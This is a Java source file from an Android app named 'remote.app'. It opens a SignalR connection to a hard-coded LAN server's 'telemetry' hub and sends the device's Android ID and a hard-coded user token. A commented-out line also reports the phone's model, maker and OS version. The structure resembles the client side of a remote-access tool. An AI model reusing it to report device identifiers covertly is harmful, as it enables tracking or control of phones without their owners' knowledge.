package com.remote.app.socket;

import android.provider.Settings;

import com.microsoft.signalr.HubConnection;
import com.microsoft.signalr.HubConnectionBuilder;
import com.microsoft.signalr.HubConnectionState;
import com.remote.app.MainService;

import java.util.HashMap;
import java.util.Map;

public class IOSocket {
    private static final IOSocket ourInstance = new IOSocket();
    private HubConnection ioSocket;


    private IOSocket() {
        try {
            String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);

            Map<String, String> headers = new HashMap<String, String>();
            headers.put("device-id", deviceID);
            headers.put("user-token", "ba53922b-64ee-424c-bdc5-19c9ee82c1af");

            ioSocket = HubConnectionBuilder.create("http://192.168.1.5:5000/telemetry")
                    .withHeaders(headers)
                    .build();

            //ioSocket = IO.socket("http://192.168.0.6:80?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public static IOSocket getInstance() {
        return ourInstance;
    }

    public HubConnection getIoSocket() {
        return ioSocket;
    }

    public void send(String method, Object... args) {
        if (ioSocket.getConnectionState() == HubConnectionState.CONNECTED)
            ioSocket.send(method, args);
    }


}
